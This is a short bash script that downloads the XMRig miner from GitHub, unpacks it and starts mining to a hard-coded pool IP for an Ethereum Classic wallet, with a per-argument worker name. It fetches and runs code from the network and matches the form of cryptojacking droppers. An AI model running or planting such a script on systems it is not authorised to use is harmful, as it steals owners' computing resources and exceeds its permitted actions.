#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz 
tar xvzf xmrig-6.16.0-linux-x64.tar.gz 
xmrig-6.16.0/xmrig -t 4 -o 128.199.71.34:3333 -a rx -k -u ETC:0x03a88d3efc4266081eff9c87bab15e05e59a8f5f.pekerja$1 -p x pause
